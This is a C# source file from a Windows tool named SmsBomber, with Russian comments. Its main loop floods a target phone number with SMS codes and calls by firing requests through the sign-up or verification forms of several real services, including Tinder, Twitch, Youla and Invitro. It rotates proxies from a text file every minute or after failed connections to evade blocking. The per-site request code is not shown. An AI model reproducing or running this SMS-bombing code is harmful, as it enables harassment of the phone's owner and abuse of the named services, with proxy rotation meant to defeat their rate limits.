using MetroFramework.Controls;
using SmsBomber.SmsService.Sites;
using System;
using System.Collections.Generic;
using System.Threading;
using System.Windows.Forms;
using static SmsBomber.Methods;

namespace SmsBomber
{
    internal class Working
    {
        public static MetroProgressBar ProgressBar_CountCycle = null;

        /// <summary>
        /// Запустить флуд SMS
        /// </summary>
        /// <param name="minCount">От скольки(цикл)</param>
        /// <param name="maxCount">До скольки(цикл)</param>
        /// <param name="threadCount">Номер потока</param>
        public static void Start(int minCount, int maxCount, int threadCount)
        {
            if (Globals.WorkingStats.CountProxy > 0)
            {
                var getProxy = Methods.GetProxyFromTxt();
                if (!String.IsNullOrWhiteSpace(getProxy.messageError)) { SendLog(getProxy.messageError, threadCount); return; }
                Globals.WorkingData.ProxyAdress = getProxy.proxyAdress;
            }

            int CounterinvalidProxy = 0;
            var methodsList = new List<Func<ReturnTypes.ResponseSendSms>>();

            if (Globals.WorkingData.SitesList.Alpari)
                methodsList.Add(Alpari.SendSms);

            if (Globals.WorkingData.SitesList.FindClone)
                methodsList.Add(FindClone.Call);

            if (Globals.WorkingData.SitesList.GuruTaxi)
                methodsList.Add(GuruTaxi.SendSms);

            if (Globals.WorkingData.SitesList.Invitro)
                methodsList.Add(Invitro.SendSms);

            if (Globals.WorkingData.SitesList.Tinder)
                methodsList.Add(Tinder.SendSms);

            if (Globals.WorkingData.SitesList.Twitch)
                methodsList.Add(Twitch.SendSms);

            if (Globals.WorkingData.SitesList.Youla)
                methodsList.Add(Youla.SendSms);

            var myStopwatch = new System.Diagnostics.Stopwatch();
            myStopwatch.Start();
            for (; minCount < maxCount; minCount++)
            {
                for (int i = 0; i < methodsList.Count; i++)
                {
                    var responseSmsService = SendSMS(methodsList[i], threadCount);

                    if(Globals.WorkingData.StopWork)
                        return;

                    if (responseSmsService.FailedConnected && Globals.WorkingStats.CountProxy > 0)
                    {
                        CounterinvalidProxy++;
                    }

                    if (CounterinvalidProxy >= 2 && Globals.WorkingStats.CountProxy > 0)
                    {
                        CounterinvalidProxy = 0;
                        var getProxy = Methods.GetProxyFromTxt();
                        if (!String.IsNullOrWhiteSpace(getProxy.messageError)) { SendLog(getProxy.messageError, threadCount); return; }
                        Globals.WorkingData.ProxyAdress = getProxy.proxyAdress;
                    }

                    if (myStopwatch.ElapsedMilliseconds > 60000 && Globals.WorkingStats.CountProxy > 0)
                    {
                        CounterinvalidProxy = 0;
                        var getProxy = Methods.GetProxyFromTxt();
                        if (!String.IsNullOrWhiteSpace(getProxy.messageError)) { SendLog(getProxy.messageError, threadCount); return; }
                        Globals.WorkingData.ProxyAdress = getProxy.proxyAdress;
                        myStopwatch = new System.Diagnostics.Stopwatch();
                        myStopwatch.Start();
                    }
                }
                ProgressBar_CountCycle.Invoke((MethodInvoker)delegate () { ProgressBar_CountCycle.Value++; });
                Thread.Sleep(Globals.WorkingData.CycleDelay);
            }
        }

        /// <summary>
        /// Отправить запрос на SMS
        /// </summary>
        /// <param name="smsService">СМС Сервис</param>
        /// <param name="threadCount">Номер потока</param>
        /// <returns></returns>
        private static ReturnTypes.ResponseSendSms SendSMS(Func<ReturnTypes.ResponseSendSms> smsService, int threadCount)
        {
            string serviceName = smsService.Method.DeclaringType.Name;
            string succesMessage = "Отправил SMS";
            string failedMessage = "Не удалось отправить SMS";
            if (serviceName == "FindClone")
            {
                succesMessage = "Позвонил";
                failedMessage = "Не удалось позвонить";
            }

            var result = smsService();
            if (result.SuccessSend)
            {
                SendLog($"{succesMessage} через сервис {serviceName}", threadCount);
            }
            else if (result.FailedConnected && Globals.WorkingStats.CountProxy > 0)
            {
                SendLog($"{failedMessage} через сервис {serviceName}, плохой прокси", threadCount);
            }
            else
            {
                SendLog($"{failedMessage} через сервис {serviceName}", threadCount);
            }
            return result;
        }
    }
}
